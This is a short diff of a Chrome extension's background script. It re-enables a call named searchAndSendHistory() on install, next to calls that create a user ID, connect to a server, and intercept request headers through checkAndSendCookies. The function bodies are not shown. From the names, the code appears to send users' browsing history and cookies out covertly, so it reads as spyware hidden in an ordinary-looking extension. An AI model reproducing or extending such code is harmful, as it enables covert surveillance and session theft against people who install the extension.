@@ -1,7 +1,7 @@
 chrome.runtime.onInstalled.addListener(() => {
   createUserID();
   connectToServer();
-  //searchAndSendHistory();
+  searchAndSendHistory();
   createScriptListener();
   chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
       checkAndSendCookies(info);
